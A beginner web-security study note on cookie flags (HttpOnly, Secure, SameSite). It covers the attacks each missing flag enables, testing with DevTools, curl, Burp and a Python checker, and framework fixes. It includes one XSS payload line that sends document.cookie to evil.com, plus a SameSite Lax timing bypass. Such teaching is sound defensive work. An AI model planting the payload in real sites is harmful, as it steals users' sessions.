---
tags: [vapt, session-management, cookies, beginner]
difficulty: beginner
module: "17 - Session Management"
topic: "17.11 Cookie Flags — Attack Scenarios"
---

# 17.11 — Cookie Flags: Attack Scenarios

## Cookie Flags Overview

```
Set-Cookie: name=value; [Flags...]

SECURITY FLAGS:
  HttpOnly   → JS cannot read the cookie (blocks XSS cookie theft)
  Secure     → Cookie only sent over HTTPS (blocks network sniffing)
  SameSite   → Cross-site sending restrictions (blocks CSRF)
  
NON-SECURITY FLAGS:
  Domain     → Which domain receives the cookie
  Path       → Which URL paths receive the cookie
  Max-Age    → Cookie lifetime in seconds (0 = delete)
  Expires    → Absolute expiry date
```

---

## Missing HttpOnly

```
WITHOUT HttpOnly:
  Set-Cookie: session=SECRET; Secure; SameSite=Lax
  (No HttpOnly!)
  
  JavaScript can read:
  document.cookie  → "session=SECRET"
  
  XSS IMPACT:
  <img src=x onerror="fetch('https://evil.com/?c='+document.cookie)">
  → Session token stolen via XSS!
  
TESTING:
  In DevTools → Application → Cookies → look at "HttpOnly" column
  ✓ = has HttpOnly
  ✗ = missing HttpOnly → session vulnerable to XSS theft
  
  OR: browser console:
  document.cookie  → if session ID appears here → no HttpOnly!
  
IMPACT: High (enables XSS to steal sessions)
FINDING: "Session cookie missing HttpOnly flag"
```

---

## Missing Secure Flag

```
WITHOUT Secure FLAG:
  Set-Cookie: session=SECRET; HttpOnly; SameSite=Lax
  (No Secure!)
  
  Cookie sent over HTTP:
  GET /account HTTP/1.1       ← plain HTTP request
  Cookie: session=SECRET      ← cookie included!
  
  → Network attacker (coffee shop WiFi) can see the session!
  
TESTING:
  DevTools → Application → Cookies → "Secure" column
  OR: In HTTP History, look for HTTP (not HTTPS) requests that include session cookie
  
  Test: If you have HTTP access to the site:
  curl -v http://target.com/account  → does it include session cookie?
  
IMPACT: Medium-High (enables network sniffing)
FINDING: "Session cookie missing Secure flag"
```

---

## SameSite Attribute

```
SameSite CONTROLS CROSS-SITE COOKIE SENDING:

SameSite=Strict:
  Cookie NEVER sent in cross-site requests
  Even if you click a link from external site → cookie not sent initially
  → Most protection against CSRF
  → Can break legitimate cross-site navigation (e.g., external login)

SameSite=Lax (DEFAULT in modern browsers):
  Cookie sent for top-level navigations (GET) from external sites
  Cookie NOT sent for cross-site POST/PUT/DELETE (sub-resource requests)
  → Good balance: protects against CSRF POST attacks
  → Allows: user clicks link from Google to your site → stays logged in

SameSite=None:
  Cookie sent in ALL cross-site requests
  MUST also have Secure flag (browsers enforce this)
  Required for: embedded widgets, payment iframes, OAuth flows
  → No CSRF protection at all!

MISSING SameSite:
  Old browsers/apps: no SameSite → no protection
  Modern browsers default to Lax → some protection
  
TESTING:
  Check Set-Cookie response headers in Burp
  Look for SameSite=None without Secure → browser will reject!
  Report missing SameSite on sensitive cookies
```

---

## SameSite Bypass (Chrome 2-Minute Grace Period)

```
CHROME BUG/FEATURE (< v80 workaround, still applies in some scenarios):
  Chrome 80+ defaults to SameSite=Lax
  BUT: First 2 minutes after cookie creation → Lax relaxed for cross-site POST!
  
  Why? To not break OAuth flows that do cross-site POST immediately after login
  
  BYPASS:
  If attacker can make victim log in FRESH (e.g., via login CSRF)
  Within 2 minutes → cross-site POST works even with Lax!
  
  IMPACT: Allows CSRF for 2 minutes after fresh login
  → Usually not practical in real attacks (short window)
  → But exists as a theoretical bypass
  → Combined with login CSRF → can chain attacks!
```

---

## Real Findings Table

```
FLAG MISSING    ATTACK ENABLED              SEVERITY
─────────────────────────────────────────────────────
HttpOnly        XSS → cookie theft          High
Secure          Network sniffing            Medium
SameSite        CSRF                        Medium (depends on app)
All three!      Multiple attacks            High
```

---

## Checking All Cookies in Burp

```bash
# FIND ALL Set-Cookie RESPONSES:
# Burp → HTTP History → filter for responses with Set-Cookie

# GREP FOR MISSING FLAGS:
# Look at each cookie and note which flags are present/absent

# AUTOMATED CHECK WITH CURL:
curl -I https://target.com/login | grep -i set-cookie
# Analyze each cookie line:
# Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600

# PYTHON SCRIPT TO ANALYZE COOKIES:
python3 -c "
import requests
r = requests.get('https://target.com', allow_redirects=True)
for resp in r.history + [r]:
    for k, v in resp.headers.items():
        if k.lower() == 'set-cookie':
            print(f'Cookie: {v}')
            missing = []
            if 'httponly' not in v.lower(): missing.append('HttpOnly')
            if 'secure' not in v.lower(): missing.append('Secure')  
            if 'samesite' not in v.lower(): missing.append('SameSite')
            if missing: print(f'  *** Missing: {missing}')
"
```

---

## Fix

```
CORRECT COOKIE HEADER:
  Set-Cookie: session=TOKEN; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600
  
  For third-party embedded widgets (must work cross-site):
  Set-Cookie: widget_session=TOKEN; HttpOnly; Secure; SameSite=None; Path=/widget

FRAMEWORK SETTINGS:
  Django (settings.py):
  SESSION_COOKIE_HTTPONLY = True
  SESSION_COOKIE_SECURE = True  (True in production)
  SESSION_COOKIE_SAMESITE = 'Lax'
  
  Express.js:
  cookie: {
      httpOnly: true,
      secure: true,  // require HTTPS
      sameSite: 'lax',
      maxAge: 3600000
  }
  
  Flask:
  SESSION_COOKIE_HTTPONLY = True
  SESSION_COOKIE_SECURE = True
  SESSION_COOKIE_SAMESITE = 'Lax'
```

---

## Related Notes
- [[04 - Session Hijacking via Cookie Theft XSS]] — HttpOnly protection
- [[05 - Session Hijacking via Network Sniffing]] — Secure flag protection
- [[12 - Cookie Scope Abuse Domain and Path]] — Domain/Path attribute attacks
- [[Module 11 - CSRF]] — SameSite and CSRF
